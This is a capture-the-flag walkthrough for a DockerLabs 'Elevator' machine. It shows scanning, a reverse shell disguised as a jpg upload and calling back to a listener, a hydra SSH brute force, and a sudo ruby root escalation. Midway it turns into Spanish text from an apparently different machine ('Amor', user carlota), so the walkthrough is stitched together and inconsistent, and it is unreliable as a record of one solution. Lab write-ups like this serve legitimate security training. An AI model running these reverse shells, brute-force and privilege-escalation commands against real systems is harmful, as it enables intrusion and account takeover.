# Elevator Machine

Level -> Easy

Author -> [beafn28](https://www.linkedin.com/in/beatriz-fresno-naumova-3797b931b/)

------------------
## Scanning & Enumeration 

We start by performing a general scan with **nmap** on the victim machine's IP to identify the open ports. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

We run a set of default scripts with **nmap** to gather more information related to the ports discovered in the previous scan.

```shell
nmap -sCV -p80 172.17.0.2
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
```

We access the website to inspect it.

![image](https://github.com/user-attachments/assets/638d5eea-f884-48ff-a8a7-81d2d60049f3)

![image](https://github.com/user-attachments/assets/a4b792c1-8d57-4eb1-b3a4-6dac127a1c68)

![image](https://github.com/user-attachments/assets/09a22ca9-37fc-497b-82bc-6aa3b6855238)

After reviewing the page code and interacting with it, we found relevant information such as usernames: **daphne**, **velma**, **scooby**, **shaggy**

We performing a **fuzzing** with **gobuster**

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -x html,php,txt -s 200,301 -b ''
---------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 5647]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
```
We found the **javascript** and **themes** directories. After reviewing them, we encountered an unauthorized error and performed **fuzzing** on them.

```shell
gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-Content/common-and-spanish.txt -t 20 -x html,php,txt -b '' -s 200,301
---------------------------------------------------------------------------------
/archivo.html         (Status: 200) [Size: 3380]
/upload.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
```

Now we found the **archivo.html** and **upload.php** files and the **uploads** directory.

--------------
## Explotation

After reviewing the **archivo.html** page we realized that the form can upload **jpg**, and **jpeg**.

![image](https://github.com/user-attachments/assets/55b5577e-1995-4d60-97eb-15fe5b20ac0f)

We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) and copy it as a **jpg** file 

Notice that we set the **172.17.0.1** and **4444** as a **IP** and **PORT** for listener

```shell
wget -O reverse.jpg 'https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash'
Saving to: ‘reverse.jpg’
reverse.jpg [ <=> ]   2.53K  --.-KB/s    in 0s      
2024-12-26 21:09:41 (5.82 MB/s) - ‘reverse.jpg’ saved [2590]
```
![image](https://github.com/user-attachments/assets/1872f317-00b9-48e5-ba2c-9710558af290)

![image](https://github.com/user-attachments/assets/a4d9f597-e9cf-40c2-969e-d40bdb017f94)

We start the listener 

Aplicamos fuerza bruta con **hydra** sobre los usuarios:

```shell
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
-------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```

Encontramos las credenciales de carlota -> **carlota:babygirl**
Accedemos por ssh:

```shell
ssh carlota@172.17.0.2
```

Estamos dentro !

------------------------------
## Escalada de privilegios

En el directorio **/home/Desktop/fotos/vacaciones** de Carlota encontramos una imágen.

Nos la descargaremos para verla. Podemos usar **scp**:

```shell
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/albertomarcostic/Desktop/DockerLabs/Amor/content
```

Veremos si tiene algo oculto con la herramienta **steghide**:

```shell
steghide --extract -sf imagen.jpg
--------------------------------------
datos extrados e/"secret.txt".
```

Obtenemos un **secret.txt** con la siguiente información -> **ZXNsYWNhc2FkZXBpbnlwb24=**

Tiene pinta de **base64** así que lo decoficamos:

```shell
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
-------------------------------------------------------
eslacasadepinypon
```

Usaremos esta información como contraseña para intentar migrar a otro usuario o convertirnos en **root**:

```shell
su oscar
```

Conseguimos migrar al usuario **oscar**.
Ejecutamos **sudo -l** para ver si podemos ejecutar algo como otro usuario o como **root**:

```shell
sudo -l
------------------------------------------------
User oscar may run the following commands on 6ba86e9dc48a:
    (ALL) NOPASSWD: /usr/bin/ruby
```


Podemos ejecutar **ruby** como el usuario **root**, si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins]()

```shell
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo en la máquina.

```shell
cat /root/Desktop/THX.txt
-------------------------------
Gracias a toda la comunidad de Dockerlabs y a Mario por toda la ayuda proporcionada para poder hacer la máquina.
```
